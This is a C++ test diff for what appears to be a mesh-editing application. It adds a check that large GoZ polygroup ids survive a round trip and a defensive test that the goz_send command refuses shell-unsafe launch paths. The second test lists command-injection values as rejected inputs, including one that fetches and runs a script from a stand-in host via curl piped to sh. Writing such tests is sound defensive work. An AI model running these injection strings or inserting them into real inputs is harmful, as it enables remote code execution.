@@ -333,3 +333,40 @@ TEST(stl_round_trip_and_ascii) {
     const char notStl[] = "hello";
     CHECK(!parseStl(std::span(reinterpret_cast<const uint8_t*>(notStl), sizeof(notStl) - 1), tet, err));
 }
+
+TEST(goz_large_polygroup_ids_stay_distinct) {
+    // GoZ ids are 16-bit: ids past 65535 are renumbered, not truncated into other groups.
+    Mesh m = makeIcosphere(2);
+    m.ensurePolygroups();
+    for (uint32_t t = 0; t < m.triangleCount(); ++t) m.polygroups[t] = t % 3 == 0 ? 1u : t % 3 == 1 ? 65536u : 65537u;
+    Mesh r;
+    std::string err;
+    CHECK(parseGoz(writeGoz(m, "Groups", GozWriteOptions{false}), r, err));
+    CHECK(r.polygroups.size() == m.polygroups.size());
+    bool same = r.polygroups.size() == m.polygroups.size();
+    for (size_t a = 0; same && a < m.polygroups.size(); ++a)
+        for (size_t b : {size_t(0), size_t(1), size_t(2)})
+            same = same && ((m.polygroups[a] == m.polygroups[b]) == (r.polygroups[a] == r.polygroups[b]));
+    CHECK(same); // the same partition into groups
+    std::vector<uint32_t> ids = r.polygroups;
+    std::sort(ids.begin(), ids.end());
+    CHECK(std::unique(ids.begin(), ids.end()) - ids.begin() == 3);
+}
+
+TEST(goz_send_refuses_shell_unsafe_launch_paths) {
+    namespace fs = std::filesystem;
+    CHECK(gozShellSafePath("/Applications/ZBrush 2024/ZBrush.app"));
+    for (const char* bad : {"$(curl evil|sh)", "x\" & calc & \"", "`id`", "%COMSPEC%", "a\nb"}) CHECK(!gozShellSafePath(bad));
+    const fs::path root = fs::temp_directory_path() / "sf_goz_unsafe";
+    fs::remove_all(root);
+    CommandRegistry reg;
+    Document doc = makeDoc(makeIcosphere(1));
+    CommandResult r = reg.execute(doc, "goz_send", {{"folder", root.string()}, {"zbrush", "$(curl evil|sh)"}});
+    CHECK(!r.ok && !fs::exists(root / "GoZProjects")); // refused before anything is written or run
+    r = reg.execute(doc, "goz_send", {{"folder", root.string()}, {"zbrush", (root / "calc").string()}});
+    CHECK(!r.ok); // not a ZBrush
+    r = reg.execute(doc, "goz_send", {{"folder", (root / "$(id)").string()}});
+    CHECK(!r.ok);
+    CHECK(reg.execute(doc, "goz_send", {{"folder", (root / "$(id)").string()}, {"launch", false}}).ok); // nothing launched
+    fs::remove_all(root);
+}
